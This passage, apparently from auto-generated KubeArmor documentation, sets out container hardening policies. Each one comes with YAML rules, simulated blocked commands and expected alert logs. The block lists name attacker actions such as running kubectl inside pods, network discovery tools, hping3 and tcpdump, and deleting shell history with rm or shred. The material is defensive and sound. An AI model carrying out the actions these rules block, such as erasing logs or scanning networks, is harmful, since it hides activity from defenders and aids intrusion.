root@wordpress-fb448db97-wj7n7:/var/tmp# ls /var/tmp                                                                    xvzf                                                                                                                    
root@wordpress-fb448db97-wj7n7:/var/tmp# /var/tmp/xvzf                                                                  
bash: /var/tmp/xvzf: Permission denied                                                                                  
root@wordpress-fb448db97-wj7n7:/var/tmp#  
```

#### Expected Alert
```
{
  "Action": "Block",
  "ClusterName": "d3mo",
  "ContainerID": "548176888fca6bb6d66633794f3d5f9d54930a9d9f43d4f05c11de821c758c0f",
  "ContainerImage": "docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845",
  "ContainerName": "wordpress",
  "Data": "syscall=SYS_OPEN flags=O_WRONLY|O_CREAT|O_EXCL|O_TRUNC",
  "Enforcer": "AppArmor",
  "HostName": "master-node",
  "HostPID": 30490,
  "HostPPID": 6119,
  "Labels": "app=wordpress",
  "Message": "Alert! Execution attempted inside /tmp",
  "NamespaceName": "wordpress-mysql",
  "Operation": "File",
  "Owner": {
    "Name": "wordpress",
    "Namespace": "wordpress-mysql",
    "Ref": "Deployment"
  },
  "PID": 193,
  "PPID": 6119,
  "ParentProcessName": "/var/lib/rancher/k3s/data/24a53467e274f21ca27cec302d5fbd58e7176daf0a47a2c9ce032ee877e0979a/bin/containerd-shim-runc-v2",
  "PodName": "wordpress-fb448db97-wj7n7",
  "PolicyName": "ksp-block-exec-inside-tmp",
  "ProcessName": "/bin/bash",
  "Resource": "/tmp/sh-thd-2512146865",
  "Result": "Permission denied",
  "Severity": "1",
  "Source": "/bin/bash",
  "Tags": "CIS,CIS_Linux",
  "Timestamp": 1696492433,
  "Type": "MatchedPolicy",
  "UpdatedTime": "2023-10-05T07:53:53.259403Z",
  "cluster_id": "2302",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "tenant_id": "167",
  "workload": "1"
}
```

## References
[STIG no exec in /tmp](https://www.stigviewer.com/stig/red_hat_enterprise_linux_6/2016-12-16/finding/V-57569)<br />[The biggest ransomeware attacks in history](https://www.techtarget.com/searchsecurity/tip/The-biggest-ransomware-attacks-in-history)<br />[Shields Healthcare Group Data Breach](https://www.idstrong.com/sentinel/shields-healthcare-group-data-breach/)<br />



</details>


<details><summary><h2>Admin tools: Do not allow execution of administrative/maintenance tools inside the pods.</h2></summary>

### Description
Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.

### Attack Scenario
It's important to note that attackers with permissions could potentially run 'kubectl exec' to execute malicious code and compromise resources within a cluster. It's crucial to monitor the activity within the cluster and take proactive measures to prevent these attacks from occurring.<br /> **Attack Type** Command Injection, Lateral Movements, etc.<br /> **Actual Attack** Target cyberattack, Supply Chain Attacks

### Compliance
- NIST_800-53_AU-2
- MITRE_T1609_container_administration_command
- NIST_800-53_SI-4

## Policy
### Admin tools
```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: harden-dvwa-web-k8s-client-tool-exec
  namespace: default
spec:
  action: Block
  message: Alert! k8s client tool executed inside container.
  process:
    matchPaths:
    - path: /usr/local/bin/kubectl
    - path: /usr/bin/kubectl
    - path: /usr/local/bin/docker
    - path: /usr/bin/docker
    - path: /usr/local/bin/crictl
    - path: /usr/bin/crictl
  selector:
    matchLabels:
      app: dvwa-web
      tier: frontend
  severity: 5
  tags:
  - MITRE_T1609_container_administration_command
  - MITRE_TA0002_execution
  - MITRE_T1610_deploy_container
  - MITRE
  - NIST_800-53
  - NIST_800-53_AU-2
  - NIST_800-53_SI-4
  - NIST
```
#### Simulation
```sh
kubectl exec -it dvwa-web-566855bc5b-4j4vl -- bash
root@dvwa-web-566855bc5b-4j4vl:/var/www/html# kubectl
bash: /usr/bin/kubectl: Permission denied
root@dvwa-web-566855bc5b-4j4vl:/var/www/html#
```

#### Expected Alert
```
{
  "ATags": null,
  "Action": "Block",
  "ClusterName": "aditya",
  "ContainerID": "32015ebeea9e1f4d4e7dbf6608c010ef2b34c48f1af11a5c6f0ea2fd27c6ba6c",
  "ContainerImage": "docker.io/cytopia/dvwa:php-8.1@sha256:f7a9d03b1dfcec55757cc39ca2470bdec1618b11c4a51052bb4f5f5e7d78ca39",
  "ContainerName": "dvwa",
  "Data": "syscall=SYS_EXECVE",
  "Enforcer": "AppArmor",
  "HashID": "1167b21433f2a4e78a4c6875bb34232e6a2b3c8535e885bb4f9e336fd2801d92",
  "HostName": "aditya",
  "HostPID": 38035,
  "HostPPID": 37878,
  "Labels": "tier=frontend,app=dvwa-web",
  "Message": "",
  "NamespaceName": "default",
  "Operation": "Process",
  "Owner": {
    "Name": "dvwa-web",
    "Namespace": "default",
    "Ref": "Deployment"
  },
  "PID": 554,
  "PPID": 548,
  "PodName": "dvwa-web-566855bc5b-4j4vl",
  "PolicyName": "DefaultPosture",
  "ProcessName": "/usr/bin/kubectl",
  "Resource": "/usr/bin/kubectl",
  "Result": "Permission denied",
  "Severity": "",
  "Source": "/bin/bash",
  "Tags": "",
  "Timestamp": 1696326880,
  "Type": "MatchedPolicy",
  "UID": 0,
  "UpdatedTime": "2023-10-03T09:54:40.056501Z",
  "cluster_id": "3896",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "workload": "1"
}
```

## References
[MITRE ATT&CK execution in k8s](https://cloud.redhat.com/blog/protecting-kubernetes-against-mitre-attck-execution#:~:text='kubectl%20exec'%20allows%20a%20user,compromise%20resources%20within%20a%20cluster)<br />[Target Data Breach](https://www.idstrong.com/sentinel/that-one-time-target-lost-everything/)<br />



</details>


<details><summary><h2>Discovery tools: Do not allow discovery/search of tools/configuration.</h2></summary>

### Description
Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system

### Attack Scenario
Adversaries can potentially use information related to services, remote hosts, and local network infrastructure devices, including those that may be vulnerable to remote software exploitation to perform malicious attacks like exploiting open ports and injecting payloads to get remote shells. It's crucial to take proactive measures to prevent these attacks from occurring, such as implementing proper network segmentation and hardening network devices.<br /> **Attack Type** Reconnaissance, Brute force, Command Injection<br /> **Actual Attack** Microsoft exchange server attack 2021

### Compliance
- CIS Distribution Independent Linuxv2.0
- Control-Id: 6.3

## Policy
### Discovery tools
```yaml
Version: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: harden-dvwa-web-network-service-scanning
  namespace: default
spec:
  action: Block
  message: Network service has been scanned!
  process:
    matchPaths:
    - path: /usr/bin/netstat
    - path: /bin/netstat
    - path: /usr/sbin/ip
    - path: /usr/bin/ip
    - path: /sbin/ip
    - path: /bin/ip
    - path: /usr/sbin/iw
    - path: /sbin/iw
    - path: /usr/sbin/ethtool
    - path: /sbin/ethtool
    - path: /usr/sbin/ifconfig
    - path: /sbin/ifconfig
    - path: /usr/sbin/arp
    - path: /sbin/arp
    - path: /usr/sbin/iwconfig
    - path: /sbin/iwconfig
  selector:
    matchLabels:
      app: dvwa-web
      tier: frontend
  severity: 5
  tags:
  - MITRE
  - FGT1046
  - CIS
```
#### Simulation
```sh
kubectl exec -it dvwa-web-566855bc5b-xtgwq -- bash
root@dvwa-web-566855bc5b-xtgwq:/var/www/html# netstat
bash: /bin/netstat: Permission denied
root@dvwa-web-566855bc5b-xtgwq:/var/www/html# ifconfig
bash: /sbin/ifconfig: Permission denied
root@dvwa-web-566855bc5b-xtgwq:/var/www/html#
root@dvwa-web-566855bc5b-xtgwq:/var/www/html# arp
bash: /usr/sbin/arp: Permission denied
```

#### Expected Alert
```
{
  "Action": "Block",
  "ClusterName": "no-trust",
  "ContainerID": "e8ac2e227d293e76ab81a34945b68f72a2618ed3275ac64bb6a82f9cd2d014f1",
  "ContainerImage": "docker.io/cytopia/dvwa:php-8.1@sha256:f7a9d03b1dfcec55757cc39ca2470bdec1618b11c4a51052bb4f5f5e7d78ca39",
  "ContainerName": "dvwa",
  "Data": "syscall=SYS_EXECVE",
  "Enforcer": "AppArmor",
  "HostName": "aditya",
  "HostPID": 35592,
  "HostPPID": 35557,
  "Labels": "tier=frontend,app=dvwa-web",
  "Message": "Network service has been scanned!",
  "NamespaceName": "default",
  "Operation": "Process",
  "Owner": {
    "Name": "dvwa-web",
    "Namespace": "default",
    "Ref": "Deployment"
  },
  "PID": 989,
  "PPID": 983,
  "ParentProcessName": "/bin/bash",
  "PodName": "dvwa-web-566855bc5b-npjn8",
  "PolicyName": "harden-dvwa-web-network-service-scanning",
  "ProcessName": "/bin/netstat",
  "Resource": "/bin/netstat",
  "Result": "Permission denied",
  "Severity": "5",
  "Source": "/bin/bash",
  "Tags": "MITRE,FGT1046,CIS",
  "Timestamp": 1696501152,
  "Type": "MatchedPolicy",
  "UpdatedTime": "2023-10-05T10:19:12.809606Z",
  "cluster_id": "4225",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "tenant_id": "167",
  "workload": "1"
}
```

## References
[MITRE Network Service Discovery](https://attack.mitre.org/techniques/T1046/)<br />



</details>


<details><summary><h2>Logs delete: Do not allow external tooling to delete logs/traces of critical components.</h2></summary>

### Description
Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform. 

### Attack Scenario
It's important to note that removal of indicators related to intrusion activity may interfere with event collection, reporting, or other processes used to detect such activity. This can compromise the integrity of security solutions by causing notable events to go unreported. Additionally, this activity may impede forensic analysis and incident response, due to a lack of sufficient data to determine what occurred. It's crucial to ensure that all relevant indicators are properly monitored and reported to prevent such issues from occurring.<br /> **Attack Type** Integrity Threats, Data Manipulation **Actual Attack** NetWalker, Conti, DarkSide RaaS 

### Compliance
- CIS Distribution Independent Linuxv2.0
- Control-Id: 6.6
- Control-Id: 7.6.2
- Control-Id: 7.6.3
- NIST_800-53_CM-5

## Policy
### Logs delete
```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: harden-nginx-shell-history-mod
  namespace: default
spec:
  action: Block
  file:
    matchPaths:
    - fromSource:
      - path: /usr/bin/shred
      - path: /usr/bin/rm
      - path: /bin/mv
      - path: /bin/rm
      - path: /usr/bin/mv
      path: /root/*_history
    - fromSource:
      - path: /usr/bin/shred
      - path: /usr/bin/rm
      - path: /bin/rm
      - path: /bin/mv
      - path: /usr/bin/mv
      path: /home/*/*_history
  message: Alert! shell history modification or deletion detected and prevented
  process:
    matchPaths:
    - path: /usr/bin/shred
    - path: /usr/bin/rm
    - path: /bin/mv
    - path: /bin/rm
    - path: /usr/bin/mv
  selector:
    matchLabels:
      app: nginx
  severity: 5
  tags:
  - CIS
  - NIST_800-53
  - NIST_800-53_CM-5
  - NIST_800-53_AU-6(8)
  - MITRE_T1070_indicator_removal_on_host
  - MITRE
  - MITRE_T1036_masquerading
```
#### Simulation
```sh
kubectl exec -it nginx-77b4fdf86c-x7sdm -- bash
root@nginx-77b4fdf86c-x7sdm:/# rm ~/.bash_history
rm: cannot remove '/root/.bash_history': Permission denied
root@nginx-77b4fdf86c-x7sdm:/# rm ~/.bash_history
rm: cannot remove '/root/.bash_history': Permission denied
```

#### Expected Alert
```
{
  "Action": "Block",
  "ClusterName": "0-trust",
  "ContainerID": "20a6333c6a46e0da32b3062f0ba76e9aed4fc5ef51f5ee8aec5b980963cedea3",
  "ContainerImage": "docker.io/library/nginx:latest@sha256:32da30332506740a2f7c34d5dc70467b7f14ec67d912703568daff790ab3f755",
  "ContainerName": "nginx",
  "Data": "syscall=SYS_UNLINKAT flags=",
  "Enforcer": "AppArmor",
  "HostName": "aditya",
  "HostPID": 43917,
  "HostPPID": 43266,
  "Labels": "app=nginx",
  "NamespaceName": "default",
  "Operation": "File",
  "Owner": {
    "Name": "nginx",
    "Namespace": "default",
    "Ref": "Deployment"
  },
  "PID": 392,
  "PPID": 379,
  "ParentProcessName": "/usr/bin/bash",
  "PodName": "nginx-77b4fdf86c-x7sdm",
  "PolicyName": "DefaultPosture",
  "ProcessName": "/usr/bin/rm",
  "Resource": "/root/.bash_history",
  "Result": "Permission denied",
  "Source": "/usr/bin/rm /root/.bash_history",
  "Timestamp": 1696577978,
  "Type": "MatchedPolicy",
  "UpdatedTime": "2023-10-06T07:39:38.182538Z",
  "cluster_id": "4291",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "tenant_id": "167",
  "workload": "1"
}
```

## References
[MITRE Indicator Removal](https://attack.mitre.org/techniques/T1070/)<br />



</details>


<details><summary><h2>ICMP control: Do not allow scanning tools to use ICMP for scanning the network.</h2></summary>

### Description
The Internet Control Message Protocol (ICMP) allows Internet hosts to notify each other of errors and allows diagnostics and troubleshooting for system administrators. Because ICMP can also be used by a potential adversary to perform reconnaissance against a target network, and due to historical denial-of-service bugs in broken implementations of ICMP, some network administrators block all ICMP traffic as a network hardening measure

### Attack Scenario
Adversaries may use scanning tools that utilize Internet Control Message Protocol (ICMP) to perform reconnaissance against a target network and identify potential loopholes. It's crucial to monitor network traffic and take proactive measures to prevent these attacks from occurring, such as implementing proper firewall rules and network segmentation. Additionally, it's important to stay up-to-date with the latest security patches to prevent known vulnerabilities from being exploited.<br /> **Attack Type** Network Flood, DoS(Denial of Service)<br /> **Actual Attack** Ping of Death(PoD)

### Compliance
- ICMP Control

## Policy
### ICMP Control
```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: restrict-scanning-tools
  namespace: default
spec:
  severity: 4
  selector:
    matchLabels:
      app: nginx
  network:
    matchProtocols:
    - protocol: icmp
      fromSource:
      - path: /usr/bin/ping
    - protocol: udp
      fromSource:
      - path: /usr/bin/ping
  action: Allow
  message: Scanning tool has been detected
```
#### Simulation
```sh
kubectl exec -it nginx-77b4fdf86c-x7sdm -- bash
root@nginx-77b4fdf86c-x7sdm:/# hping3 www.google.com
Unable to resolve 'www.google.com'
root@nginx-77b4fdf86c-x7sdm:/# hping3 127.0.0.1
Warning: Unable to guess the output interface
[get_if_name] socket(AF_INET, SOCK_DGRAM, 0): Permission denied
[main] no such device
root@nginx-77b4fdf86c-x7sdm:/# ping google.com
PING google.com (216.58.200.206) 56(84) bytes of data.
64 bytes from nrt12s12-in-f206.1e100.net (216.58.200.206): icmp_seq=1 ttl=109 time=51.9 ms
64 bytes from nrt12s12-in-f206.1e100.net (216.58.200.206): icmp_seq=2 ttl=109 time=60.1 ms
^C
--- google.com ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 51.917/56.005/60.094/4.088 ms
```

#### Expected Alert
```
{
  "Action": "Block",
  "ClusterName": "0-trust",
  "ContainerID": "20a6333c6a46e0da32b3062f0ba76e9aed4fc5ef51f5ee8aec5b980963cedea3",
  "ContainerImage": "docker.io/library/nginx:latest@sha256:32da30332506740a2f7c34d5dc70467b7f14ec67d912703568daff790ab3f755",
  "ContainerName": "nginx",
  "Data": "syscall=SYS_SOCKET",
  "Enforcer": "AppArmor",
  "HostName": "aditya",
  "HostPID": 86904,
  "HostPPID": 86860,
  "Labels": "app=nginx",
  "NamespaceName": "default",
  "Operation": "Network",
  "Owner": {
    "Name": "nginx",
    "Namespace": "default",
    "Ref": "Deployment"
  },
  "PID": 1064,
  "PPID": 1058,
  "ParentProcessName": "/usr/bin/bash",
  "PodName": "nginx-77b4fdf86c-x7sdm",
  "PolicyName": "DefaultPosture",
  "ProcessName": "/usr/sbin/hping3",
  "Resource": "domain=AF_INET type=SOCK_DGRAM|SOCK_NONBLOCK|SOCK_CLOEXEC protocol=0",
  "Result": "Permission denied",
  "Source": "/usr/sbin/hping3 www.google.com",
  "Timestamp": 1696593032,
  "Type": "MatchedPolicy",
  "UpdatedTime": "2023-10-06T11:50:32.098937Z",
  "cluster_id": "4291",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "tenant_id": "167",
  "workload": "1"
}
```





</details>


<details><summary><h2>Restrict Capabilities: Do not allow capabilities that can be leveraged by the attacker.</h2></summary>

### Description
Containers run with a default set of capabilities as assigned by the Container Runtime. Capabilities are parts of the rights generally granted on a Linux system to the root user. In many cases applications running in containers do not require any capabilities to operate, so from the perspective of the principal of least privilege use of capabilities should be minimized.

### Attack Scenario
Kubernetes by default connects all the containers running in the same node (even if they belong to different namespaces) down to Layer 2 (ethernet). Every pod running in the same node is going to be able to communicate with any other pod in the same node (independently of the namespace) at ethernet level (layer 2). This allows a malicious containers to perform an ARP spoofing attack to the containers on the same node and capture their traffic.<br /> **Attack Type** Reconnaissance, Spoofing<br /> **Actual Attack** Recon through P.A.S. Webshell, NBTscan

### Compliance
- CIS Kubernetes
- Control Id: 5.2.8 - Minimize the admission of containers with the NET_RAW capability
- Control Id: 5.2.9 - Minimize the admission of containers with capabilities assigned

## Policy
### Restrict Capabilities
```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: ksp-ubuntu-1-cap-net-raw-block
  namespace: multiubuntu
spec:
  severity: 1
  selector:
    matchLabels:
      container: ubuntu-1
  capabilities:
    matchCapabilities:
    - capability: net_raw
  action:
    Block
```
#### Simulation
```sh
root@ubuntu-1-deployment-f987bd4d6-xzcb8:/# tcpdump
tcpdump: eth0: You don't have permission to capture on that device
(socket: Operation not permitted)
root@ubuntu-1-deployment-f987bd4d6-xzcb8:/#    
```

#### Expected Alert
```
{
    "Action":"Block",
    "ClusterName":"k3sn0d3",
    "ContainerID":"aaf2118edcc20b3b04a0fae6164f957993bf3c047fd8cb33bc37ac7d0175e848",
    "ContainerImage":"docker.io/kubearmor/ubuntu-w-utils:0.1@sha256:b4693b003ed1fbf7f5ef2c8b9b3f96fd853c30e1b39549cf98bd772fbd99e260",
    "ContainerName":"ubuntu-1-container",
    "Data":"syscall=SYS_SOCKET",
    "Enforcer":"AppArmor",
    "HashID":"dd12f0f12a75b30d47c5815f93412f51b259b74ac0eccc9781b6843550f694a3",
    "HostName":"worker-node02",
    "HostPID":38077,
    "HostPPID":38065,
    "Labels":"container=ubuntu-1 group=group-1",
    "Message":"",
    "NamespaceName":"multiubuntu",
    "Operation":"Network",
    "Owner":{
        "Name":"ubuntu-1-deployment",
        "Namespace":"multiubuntu",
        "Ref":"Deployment"
    },
    "PID":124,
    "PPID":114,
    "PodName":"ubuntu-1-deployment-f987bd4d6-xzcb8",
    "PolicyName":"ksp-ubuntu-1-cap-net-raw-block",
    "ProcessName":"/usr/sbin/tcpdump",
    "Resource":"domain=AF_PACKET type=SOCK_RAW protocol=768",
    "Result":"Operation not permitted",
    "Severity":"1",
    "Source":"/usr/sbin/tcpdump",
    "Tags":"",
    "Timestamp":1705405378,
    "Type":"MatchedPolicy",
    "UID":0,
    "UpdatedTime":"2024-01-16T11:42:58.662928Z",
    "UpdatedTimeISO":"2024-01-16T11:42:58.662Z",
    "cluster_id":"16402",
    "component_name":"kubearmor",
    "instanceGroup":"0",
    "instanceID":"0",
    "workload":"1"
}
```

## References
[MITRE Network Service Discovery](https://attack.mitre.org/techniques/T1046/)<br />



</details>

<!-- (This is an auto-generated file. Do not edit manually.) -->

